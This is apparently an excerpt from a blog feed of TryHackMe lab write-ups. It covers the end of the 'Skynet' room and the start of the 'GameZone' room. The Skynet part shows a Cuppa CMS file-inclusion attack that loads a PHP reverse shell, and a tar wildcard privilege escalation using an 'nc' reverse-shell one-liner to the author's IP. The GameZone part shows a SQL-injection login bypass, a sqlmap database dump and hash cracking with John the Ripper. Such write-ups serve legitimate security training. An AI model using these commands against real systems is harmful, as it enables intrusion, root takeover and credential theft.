  2.00 Machine Learning.md            N       <span style="color:#ae81ff">26</span>  Tue Sep <span style="color:#ae81ff">17</span> 05:01:29 <span style="color:#ae81ff">2019</span>
  1.03 Calculus.md                    N    <span style="color:#ae81ff">40779</span>  Tue Sep <span style="color:#ae81ff">17</span> 05:01:29 <span style="color:#ae81ff">2019</span>
  3.03 Reinforcement Learning.md      N    <span style="color:#ae81ff">25119</span>  Tue Sep <span style="color:#ae81ff">17</span> 05:01:29 <span style="color:#ae81ff">2019</span>
  1.08 Probabilistic Graphical Models.md      N    <span style="color:#ae81ff">81655</span>  Tue Sep <span style="color:#ae81ff">17</span> 05:01:29 <span style="color:#ae81ff">2019</span>
  1.06 Bayesian Statistics.md         N    <span style="color:#ae81ff">39554</span>  Tue Sep <span style="color:#ae81ff">17</span> 05:01:29 <span style="color:#ae81ff">2019</span>
  6.00 Appendices.md                  N       <span style="color:#ae81ff">20</span>  Tue Sep <span style="color:#ae81ff">17</span> 05:01:29 <span style="color:#ae81ff">2019</span>
  1.01 Functions.md                   N     <span style="color:#ae81ff">7627</span>  Tue Sep <span style="color:#ae81ff">17</span> 05:01:29 <span style="color:#ae81ff">2019</span>
  2.03 Neural Nets.md                 N   <span style="color:#ae81ff">144726</span>  Tue Sep <span style="color:#ae81ff">17</span> 05:01:29 <span style="color:#ae81ff">2019</span>
  2.04 Model Selection.md             N    <span style="color:#ae81ff">33383</span>  Tue Sep <span style="color:#ae81ff">17</span> 05:01:29 <span style="color:#ae81ff">2019</span>
  2.02 Supervised Learning.md         N    <span style="color:#ae81ff">94287</span>  Tue Sep <span style="color:#ae81ff">17</span> 05:01:29 <span style="color:#ae81ff">2019</span>
  4.00 Simulation.md                  N       <span style="color:#ae81ff">20</span>  Tue Sep <span style="color:#ae81ff">17</span> 05:01:29 <span style="color:#ae81ff">2019</span>
  3.05 In Practice.md                 N     <span style="color:#ae81ff">1123</span>  Tue Sep <span style="color:#ae81ff">17</span> 05:01:29 <span style="color:#ae81ff">2019</span>
  1.07 Graphs.md                      N     <span style="color:#ae81ff">5110</span>  Tue Sep <span style="color:#ae81ff">17</span> 05:01:29 <span style="color:#ae81ff">2019</span>
  2.07 Unsupervised Learning.md       N    <span style="color:#ae81ff">21579</span>  Tue Sep <span style="color:#ae81ff">17</span> 05:01:29 <span style="color:#ae81ff">2019</span>
  2.05 Bayesian Learning.md           N    <span style="color:#ae81ff">39443</span>  Tue Sep <span style="color:#ae81ff">17</span> 05:01:29 <span style="color:#ae81ff">2019</span>
  5.03 Anonymization.md               N     <span style="color:#ae81ff">2516</span>  Tue Sep <span style="color:#ae81ff">17</span> 05:01:29 <span style="color:#ae81ff">2019</span>
  5.01 Process.md                     N     <span style="color:#ae81ff">5788</span>  Tue Sep <span style="color:#ae81ff">17</span> 05:01:29 <span style="color:#ae81ff">2019</span>
  1.09 Optimization.md                N    <span style="color:#ae81ff">25823</span>  Tue Sep <span style="color:#ae81ff">17</span> 05:01:29 <span style="color:#ae81ff">2019</span>
  1.05 Statistics.md                  N    <span style="color:#ae81ff">64291</span>  Tue Sep <span style="color:#ae81ff">17</span> 05:01:29 <span style="color:#ae81ff">2019</span>
  5.02 Visualization.md               N      <span style="color:#ae81ff">940</span>  Tue Sep <span style="color:#ae81ff">17</span> 05:01:29 <span style="color:#ae81ff">2019</span>
  5.00 In Practice.md                 N       <span style="color:#ae81ff">21</span>  Tue Sep <span style="color:#ae81ff">17</span> 05:01:29 <span style="color:#ae81ff">2019</span>
  4.02 Nonlinear Dynamics.md          N    <span style="color:#ae81ff">44601</span>  Tue Sep <span style="color:#ae81ff">17</span> 05:01:29 <span style="color:#ae81ff">2019</span>
  1.10 Algorithms.md                  N    <span style="color:#ae81ff">28790</span>  Tue Sep <span style="color:#ae81ff">17</span> 05:01:29 <span style="color:#ae81ff">2019</span>
  3.04 Filtering.md                   N    <span style="color:#ae81ff">13360</span>  Tue Sep <span style="color:#ae81ff">17</span> 05:01:29 <span style="color:#ae81ff">2019</span>
  1.00 Foundations.md                 N       <span style="color:#ae81ff">22</span>  Tue Sep <span style="color:#ae81ff">17</span> 05:01:29 <span style="color:#ae81ff">2019</span>

                <span style="color:#ae81ff">9204224</span> blocks of size 1024. <span style="color:#ae81ff">5368836</span> blocks available
smb: <span style="color:#ae81ff">\n</span>otes<span style="color:#ae81ff">\&gt;</span> get important.txt
getting file <span style="color:#ae81ff">\n</span>otes<span style="color:#ae81ff">\i</span>mportant.txt of size <span style="color:#ae81ff">117</span> as important.txt <span style="color:#f92672">(</span>0.1 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 0.1 KiloBytes/sec<span style="color:#f92672">)</span>
smb: <span style="color:#ae81ff">\n</span>otes<span style="color:#ae81ff">\&gt;</span> 


</code></pre></div><p>once we connect to Miles&rsquo; SMB private share, we can see a file called <strong>important.txt</strong> which gives us some useful information:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">1. Add features to beta CMS /<span style="color:#f92672">{</span>URL_REDACTED<span style="color:#f92672">}</span>
2. Work on T-800 Model <span style="color:#ae81ff">101</span> blueprints
3. Spend more time with my wife
</code></pre></div><p>This file let us answer some more questions.</p>
<p>If we access the CMS URL mentioned in that note we get Miles&rsquo; personal page, some sort of about page:</p>
<p><img src="https://i.imgur.com/UwK0SiJ.png" alt="Miles Personal Page"></p>
<ul>
<li>Note: I&rsquo;ll also keep a copy of Miles Picture, just in case there is something hidden on it.</li>
</ul>
<p>Since we know have discovered a weirdly named new directory, let&rsquo;s run <strong>goBuster</strong> on that to see if we get anything else under that path:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/THM/skynet<span style="color:#f92672">]</span>
└─$ gobuster dir -u 10.10.136.30/<span style="color:#f92672">{</span>REDACTED<span style="color:#f92672">}</span> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 40 
<span style="color:#f92672">===============================================================</span>
Gobuster v3.0.1
by OJ Reeves <span style="color:#f92672">(</span>@TheColonial<span style="color:#f92672">)</span> &amp; Christian Mehlmauer <span style="color:#f92672">(</span>@_FireFart_<span style="color:#f92672">)</span>
<span style="color:#f92672">===============================================================</span>
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Url:            http://10.10.136.30/<span style="color:#f92672">{</span>REDACTED<span style="color:#f92672">}</span>
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Threads:        <span style="color:#ae81ff">40</span>
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Status codes:   200,204,301,302,307,401,403
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> User Agent:     gobuster/3.0.1
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Timeout:        10s
<span style="color:#f92672">===============================================================</span>
2020/08/25 18:58:28 Starting gobuster
<span style="color:#f92672">===============================================================</span>
/administrator <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span>

</code></pre></div><p>After a little while, we get a partial result. There is an administration page that we can look at:</p>
<p><img src="https://i.imgur.com/re6i8Bb.png" alt="CMS Login Page"></p>
<p>Thanks to this login page, we get some details about the CMS version running. With that we can search for a possible exploit:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
└─$ searchsploit cuppa
---------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                          |  Path
---------------------------------------------------------------------------------------- ---------------------------------
Cuppa CMS - <span style="color:#e6db74">&#39;/alertConfigField.php&#39;</span> Local/Remote File Inclusion                         | php/webapps/25971.txt
---------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
                                                                                                                          
┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
└─$ locate php/webapps/25971.txt
/usr/share/exploitdb/exploits/php/webapps/25971.txt
                                                                                                                          
┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
└─$ subl /usr/share/exploitdb/exploits/php/webapps/25971.txt


</code></pre></div><p>We see there is a RFI vulnerability that we could possibly exploit. Let&rsquo;s open the exploit to see what it does.
It seems thre is that <strong>/alertConfigField.php</strong> that can be exploited by adding some payload to the URL:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">http://target/cuppa/alerts/alertConfigField.php?urlConfig<span style="color:#f92672">=[</span>FI<span style="color:#f92672">]</span>
</code></pre></div><ul>
<li>[FI] indicates we can add a File Inclusion here, since a bit of code in the <strong>/alertConfigField.php</strong> file would actually load files.</li>
</ul>
<p>We&rsquo;ll download a PHP reverse shell that we can use to get access to the machine:</p>
<ul>
<li><strong>Basic PHP Reverse Shell</strong>: Click <a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell">here</a> to download.</li>
</ul>
<p>The exploit only needs two values changed, our tun0 IP and Port:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">set_time_limit (0);
$VERSION = &#34;1.0&#34;;
$ip = &#39;10.13.0.34&#39;;  // CHANGE THIS
$port = 2112;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = &#39;uname -a; w; id; /bin/sh -i&#39;;
$daemon = 0;
$debug = 0;
</code></pre></div><ul>
<li>More info on the port selected <a href="https://youtu.be/AZm1_jtY1SQ">here</a> :)</li>
</ul>
<p>Ok with the exploit ready let&rsquo;s fire up a python HTTP server to make it available:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/THM/skynet/php-reverse-shell-1.0<span style="color:#f92672">]</span>
└─$ python -m SimpleHTTPServer 
Serving HTTP on 0.0.0.0 port <span style="color:#ae81ff">8000</span> ...

</code></pre></div><p>Now we need to create a netcat listener to hopefully get our reverse shell:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">kali@kali:~$ nc -nlvp <span style="color:#ae81ff">2112</span>
listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">2112</span> ...

</code></pre></div><p>I think we are ready to try to load our payload using the URL:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">/administrator/alerts/alertConfigField.php?urlConfig<span style="color:#f92672">=</span>http://10.13.0.34:8000/revShell.php?
</code></pre></div><p>Once we run that URL on the Browser, we see our reverse shell is served and executed successfully:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">kali@kali:~$ nc -nlvp <span style="color:#ae81ff">2112</span>
listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">2112</span> ...
connect to <span style="color:#f92672">[</span>10.13.0.34<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.136.30<span style="color:#f92672">]</span> <span style="color:#ae81ff">44250</span>
Linux skynet 4.8.0-58-generic <span style="color:#75715e">#63~16.04.1-Ubuntu SMP Mon Jun 26 18:08:51 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux</span>
 18:32:05 up  2:12,  <span style="color:#ae81ff">0</span> users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span>
/bin/sh: 0: can<span style="color:#960050;background-color:#1e0010">&#39;</span>t access tty; job control turned off
$ cd home
$ ls
milesdyson
$ cd milesdyson
$ dir
backups  mail  share  user.txt
$ cat user.txt
<span style="color:#f92672">{</span>USER_FLAG_REDACTED<span style="color:#f92672">}</span>
$ 

</code></pre></div><p>With this access we should be able to read the user flag.</p>
<p>To move forward with this privesc, we need to get some more information from the system.
We put <strong>linPEAS.sh</strong> into our local HTTP server folder and using <strong>wget</strong> on the connected session we donwload it into the target machine.</p>
<p>Looking at the report from linPEAS, we see a possible exploitation for the Linux Kernel:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">/usr/bin/pkexec         ---&gt;    Linux4.10_to_5.1.17<span style="color:#f92672">(</span>CVE-2019-13272<span style="color:#f92672">)</span>/rhel_6<span style="color:#f92672">(</span>CVE-2011-1485<span style="color:#f92672">)</span>
</code></pre></div><p>We see we have a gcc exploit available <a href="https://github.com/jas502n/CVE-2019-13272">here</a></p>
<p>However, if we check the cronjobs we can see there is a job running that we could try to exploit:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">$ cat /etc/crontab
<span style="color:#75715e"># /etc/crontab: system-wide crontab</span>
<span style="color:#75715e"># Unlike any other crontab you don&#39;t have to run the `crontab&#39;</span>
<span style="color:#75715e"># command to install the new version when you edit this file</span>
<span style="color:#75715e"># and files in /etc/cron.d. These files also have username fields,</span>
<span style="color:#75715e"># that none of the other crontabs do.</span>

SHELL<span style="color:#f92672">=</span>/bin/sh
PATH<span style="color:#f92672">=</span>/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

<span style="color:#75715e"># m h dom mon dow user  command</span>
*/1 *   * * *   root    /home/milesdyson/backups/backup.sh
<span style="color:#ae81ff">17</span> *    * * *   root    cd / <span style="color:#f92672">&amp;&amp;</span> run-parts --report /etc/cron.hourly
<span style="color:#ae81ff">25</span> <span style="color:#ae81ff">6</span>    * * *   root    test -x /usr/sbin/anacron <span style="color:#f92672">||</span> <span style="color:#f92672">(</span> cd / <span style="color:#f92672">&amp;&amp;</span> run-parts --report /etc/cron.daily <span style="color:#f92672">)</span>
<span style="color:#ae81ff">47</span> <span style="color:#ae81ff">6</span>    * * <span style="color:#ae81ff">7</span>   root    test -x /usr/sbin/anacron <span style="color:#f92672">||</span> <span style="color:#f92672">(</span> cd / <span style="color:#f92672">&amp;&amp;</span> run-parts --report /etc/cron.weekly <span style="color:#f92672">)</span>
<span style="color:#ae81ff">52</span> <span style="color:#ae81ff">6</span>    <span style="color:#ae81ff">1</span> * *   root    test -x /usr/sbin/anacron <span style="color:#f92672">||</span> <span style="color:#f92672">(</span> cd / <span style="color:#f92672">&amp;&amp;</span> run-parts --report /etc/cron.monthly <span style="color:#f92672">)</span>

</code></pre></div><p>let&rsquo;s see what this sh file is about:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ cat /home/milesdyson/backups/backup.sh
<span style="color:#75715e">#!/bin/bash</span>
cd /var/www/html
tar cf /home/milesdyson/backups/backup.tgz *
</code></pre></div><p>apparently this copies the whole HTML directory and somehow the wildcards passed to <strong>tar</strong> can be exploited&hellip;
At this point my brain almost stopped working.</p>
<p>This is from THMs post:</p>
<p>Well, believe it or not, this creates a vulnerability as we can use it to  execute code. HelpNetSecurity best explains how this vulnerability works, but in essence, tar has wildcards and we can use checkpoint actions to execute commands.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">echo <span style="color:#e6db74">&#34;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.13.0.34 2113 &gt;/tmp/f&#34;</span> &gt; shell.sh
touch <span style="color:#e6db74">&#34;/var/www/html/--checkpoint-action=exec=sh shell.sh&#34;</span>
touch <span style="color:#e6db74">&#34;/var/www/html/--checkpoint=1&#34;</span>
</code></pre></div><p>So running these commands we leverage tar&rsquo;s checkpoints and we can execute arbitrary code as root. Sweet!
Let&rsquo;s try it out!</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">$ cd /var/www/html
$ ls
--checkpoint-action<span style="color:#f92672">=</span>exec<span style="color:#f92672">=</span>sh shell.sh
--checkpoint<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>
45kra24zxs28v3yd
admin
ai
config
css
image.png
index.html
js
style.css
$ echo <span style="color:#e6db74">&#34;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.13.0.34 2113 &gt;/tmp/f&#34;</span> &gt; shell.sh
$ touch <span style="color:#e6db74">&#34;/var/www/html/--checkpoint-action=exec=sh shell.sh&#34;</span>
$ touch <span style="color:#e6db74">&#34;/var/www/html/--checkpoint=1&#34;</span>

</code></pre></div><p>and we get our root shell!!</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/opt/privilege-escalation-awesome-scripts-suite/linPEAS<span style="color:#f92672">]</span>
└─$ nc -nlvp <span style="color:#ae81ff">2113</span>
listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">2113</span> ...
connect to <span style="color:#f92672">[</span>10.13.0.34<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.136.30<span style="color:#f92672">]</span> <span style="color:#ae81ff">54234</span>
/bin/sh: 0: can<span style="color:#960050;background-color:#1e0010">&#39;</span>t access tty; job control turned off
<span style="color:#75715e"># whoami</span>
root
<span style="color:#75715e"># cat /root/root.txt</span>
<span style="color:#f92672">{</span>ROOT_FLAG_REDACTED<span style="color:#f92672">}</span>
# 

</code></pre></div><p>As usual, happy hacking.</p>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">

<div class="container" style="margin:10px !important">
    <div class="center">
        <script src="https://tryhackme.com/badge/71634"></script>
    </div>
    <div class="center">
        <a href="https://twitter.com/Tzero86" target="_blank" class="fa fa-twitter" style="text-decoration: none !important;  font-size: 30px; padding: 5px"></a>
        <a href="https://github.com/Tzero86" target="_blank" class="fa fa-github" style="text-decoration: none !important;  font-size: 30px; padding: 5px"></a> 
        <br> 
</div>
]]></content>
        </item>
        
        <item>
            <title>GameZone_writeup.sh</title>
            <link>https://tzero86-bits.netlify.app/posts/gamezone_writeup/</link>
            <pubDate>Mon, 24 Aug 2020 16:19:31 -0400</pubDate>
            
            <guid>https://tzero86-bits.netlify.app/posts/gamezone_writeup/</guid>
            <description>Game Zone Room This is a quick writeup or another &amp;ldquo;just-me-taking-notes&amp;rdquo; thing for the GameZone&amp;rsquo;s TryhackMe room. This room is quite guided so there won&amp;rsquo;t be much more detail added by this writup. Just straight to the point solutions for each task. Enjoy!
 Please visit This room on TryHackMe by clicking this link. PLEASE NOTE: Passwords and flag values were intentionally masked as required by THM writeups rules. The write-up follows my step by step solution to this box, errors and all.</description>
            <content type="html"><![CDATA[<h1 id="game-zone-room">Game Zone Room</h1>
<p>This is a quick writeup or another &ldquo;just-me-taking-notes&rdquo; thing for the GameZone&rsquo;s TryhackMe room. This room is quite guided so there won&rsquo;t be much more detail added by this writup. Just straight to the point solutions for each task.
Enjoy!</p>
<ul>
<li>Please visit This room on TryHackMe by <a href="https://tryhackme.com/room/gamezone">clicking this link</a>.</li>
<li><strong>PLEASE NOTE:</strong> Passwords and flag values were intentionally masked as required by THM writeups rules. The write-up follows my step by step solution to this box, errors and all.</li>
</ul>
<h2 id="task-1-deploy-the-vulnerable-machine">[Task 1] Deploy the vulnerable machine</h2>
<blockquote>
<p>Question #2 What is the name of the large cartoon avatar holding a sniper on the forum?</p>
</blockquote>
<p>For this we could do an image search but, since I know this from my old gamer times. It was quite easy to answer. If you don&rsquo;t know the answer, google is your friend.</p>
<h2 id="task-2-obtain-access-via-sqli">[Task 2] Obtain access via SQLi</h2>
<p>So we need to exploit SQLi (injection) to get access to the server.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-SQL" data-lang="SQL">	<span style="color:#66d9ef">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">FROM</span> users <span style="color:#66d9ef">WHERE</span> username <span style="color:#f92672">=</span> <span style="color:#66d9ef">admin</span> <span style="color:#66d9ef">AND</span> password :<span style="color:#f92672">=</span> <span style="color:#e6db74">&#39; or 1=1 -- -
</span></code></pre></div><blockquote>
<p>Question#3 When you&rsquo;ve logged in, what page do you get redirected to?</p>
</blockquote>
<p>Às per the room we know there is no Admin username. In this case we can still use the following string as username leaving the password empty.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-SQL" data-lang="SQL">	<span style="color:#e6db74">&#39; or 1=1 -- -
</span></code></pre></div><p>After a using that string as username (leaving the password empty), we get logged in and arrive to a <strong>portal.php</strong> page. We can answer the question now.</p>
<h2 id="task-3-using-sqlmap">[Task 3] Using SQLMap</h2>
<p>SQLMap is a popular open-source, automatic SQL injection and database takeover tool. This comes pre-installed on all version of Kali Linux or can be manually downloaded and installed <a href="https://github.com/sqlmapproject/sqlmap">here</a>.</p>
<p>There are many different types of SQL injection (boolean/time based, etc..) and SQLMap automates the whole process trying different techniques.</p>
<p>First we need to use the portal page we are logged into, Using Burp suite intercept a simple search request made on that page. Save the request into a text file.We can then pass this into SQLMap to use our authenticated user session.</p>
<p>We just need to call SQLMap with this request following this format:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sqlmap -r search_req.txt --dbms<span style="color:#f92672">=</span>mysql --dump
</code></pre></div><ul>
<li>-r uses the intercepted request you saved earlier</li>
<li>&ndash;dbms tells SQLMap what type of database management system it is</li>
<li>&ndash;dump attempts to outputs the entire database</li>
</ul>
<p>We&rsquo;ll get something like this</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">kali@kali:~/Documents/THM/gameZone$ sqlmap -r search_req.txt --dbms<span style="color:#f92672">=</span>mysql --dump
        ___
       __H__
 ___ ___<span style="color:#f92672">[</span><span style="color:#e6db74">&#34;]_____ ___ ___  {1.4.8#stable}
</span><span style="color:#e6db74">|_ -| . [,]     | .&#39;| . |
</span><span style="color:#e6db74">|___|_  [&#34;</span><span style="color:#f92672">]</span>_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

<span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> legal disclaimer: Usage of sqlmap <span style="color:#66d9ef">for</span> attacking targets without prior mutual consent is illegal. It is the end user<span style="color:#e6db74">&#39;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
</span><span style="color:#e6db74">
</span><span style="color:#e6db74">[*] starting @ 15:09:43 /2020-08-24/
</span><span style="color:#e6db74">
</span><span style="color:#e6db74">[15:09:43] [INFO] parsing HTTP request from &#39;</span>search_req.txt<span style="color:#e6db74">&#39;
</span><span style="color:#e6db74">[15:09:43] [INFO] testing connection to the target URL
</span><span style="color:#e6db74">[15:09:44] [INFO] checking if the target is protected by some kind of WAF/IPS
</span><span style="color:#e6db74">[15:09:44] [INFO] testing if the target URL content is stable
</span><span style="color:#e6db74">[15:09:45] [INFO] target URL content is stable
</span><span style="color:#e6db74">[15:09:45] [INFO] testing if POST parameter &#39;</span>searchitem<span style="color:#e6db74">&#39; is dynamic
</span><span style="color:#e6db74">[15:09:45] [WARNING] POST parameter &#39;</span>searchitem<span style="color:#e6db74">&#39; does not appear to be dynamic
</span><span style="color:#e6db74">[15:09:45] [INFO] heuristic (basic) test shows that POST parameter &#39;</span>searchitem<span style="color:#e6db74">&#39; might be injectable (possible DBMS: &#39;</span>MySQL<span style="color:#e6db74">&#39;)
</span><span style="color:#e6db74">[15:09:46] [INFO] heuristic (XSS) test shows that POST parameter &#39;</span>searchitem<span style="color:#e6db74">&#39; might be vulnerable to cross-site scripting (XSS) attacks
</span><span style="color:#e6db74">[15:09:46] [INFO] testing for SQL injection on POST parameter &#39;</span>searchitem<span style="color:#e6db74">&#39;
</span><span style="color:#e6db74">for the remaining tests, do you want to include all tests for &#39;</span>MySQL<span style="color:#e6db74">&#39; extending provided level (1) and risk (1) values? [Y/n] y
</span><span style="color:#e6db74">[15:09:59] [INFO] testing &#39;</span>AND boolean-based blind - WHERE or HAVING clause<span style="color:#e6db74">&#39;
</span><span style="color:#e6db74">[15:09:59] [WARNING] reflective value(s) found and filtering out
</span><span style="color:#e6db74">[15:10:04] [INFO] testing &#39;</span>Boolean-based blind - Parameter replace <span style="color:#f92672">(</span>original value<span style="color:#f92672">)</span><span style="color:#e6db74">&#39;
</span><span style="color:#e6db74">[15:10:05] [INFO] testing &#39;</span>Generic inline queries<span style="color:#e6db74">&#39;
</span><span style="color:#e6db74">[15:10:05] [INFO] testing &#39;</span>AND boolean-based blind - WHERE or HAVING clause <span style="color:#f92672">(</span>MySQL comment<span style="color:#f92672">)</span><span style="color:#e6db74">&#39;
</span><span style="color:#e6db74">[15:10:29] [INFO] testing &#39;</span>OR boolean-based blind - WHERE or HAVING clause <span style="color:#f92672">(</span>MySQL comment<span style="color:#f92672">)</span><span style="color:#960050;background-color:#1e0010">&#39;</span>

</code></pre></div><p>This will take some time as SQLMap will try different ways of exploiting the DB, eventually it should dump the database.</p>
<blockquote>
<p>Question #2 In the users table, what is the hashed password?</p>
</blockquote>
<p>From the data displayed by the tool we get that answer, also the next one as well.</p>
<blockquote>
<p>Question #3 What was the username associated with the hashed password?</p>
</blockquote>
<p>Let&rsquo;s move to the next Task.</p>
<h2 id="task-4-cracking-a-password-with-johntheripper">[Task 4] Cracking a password with JohnTheRipper</h2>
<p>John the Ripper (JTR) is a fast, free and open-source password cracker. This is also pre-installed on all Kali Linux machines.</p>
<p>We will use this program to crack the hash we obtained earlier. JohnTheRipper is 15 years old and other programs such as HashCat are one of several other cracking programs out there.</p>
<p>This program works by taking a wordlist, hashing it with the specified algorithm and then comparing it to your hashed password. If both hashed passwords are the same, it means it has found it. You cannot reverse a hash, so it needs to be done by comparing hashes.</p>
<p>For this we need the hash string we found with SQLMap, save that into a txt file.</p>
<p>To run John we use the following command and we&rsquo;ll use <strong>rockyou.txt</strong> as our wordlist:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">john hash.txt --wordlist<span style="color:#f92672">=</span>/usr/share/wordlists/rockyou.txt --format<span style="color:#f92672">=</span>RAW-SHA256

</code></pre></div><p>Let&rsquo;s break down that those options mean:</p>
<ul>
<li>hash.txt - contains a list of your hashes (in your case its just 1 hash)</li>
<li>&ndash;wordlist - is the wordlist you&rsquo;re using to find the dehashed value</li>
<li>&ndash;format - is the hashing algorithm used. In our case its hashed using SHA256.</li>
</ul>
<p>Let&rsquo;s run John:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">kali@kali:~/Documents/THM/gameZone$ sudo john hash.txt --wordlist<span style="color:#f92672">=</span>/usr/share/wordlists/rockyou.txt --format<span style="color:#f92672">=</span>RAW-SHA256
Using default input encoding: UTF-8
Loaded <span style="color:#ae81ff">1</span> password hash <span style="color:#f92672">(</span>Raw-SHA256 <span style="color:#f92672">[</span>SHA256 128/128 AVX 4x<span style="color:#f92672">])</span>
Warning: poor OpenMP scalability <span style="color:#66d9ef">for</span> this hash type, consider --fork<span style="color:#f92672">=</span><span style="color:#ae81ff">8</span>
Will run <span style="color:#ae81ff">8</span> OpenMP threads
Press <span style="color:#e6db74">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span style="color:#66d9ef">for</span> status
REDACTEDPASSWORD    <span style="color:#f92672">(</span>?<span style="color:#f92672">)</span>
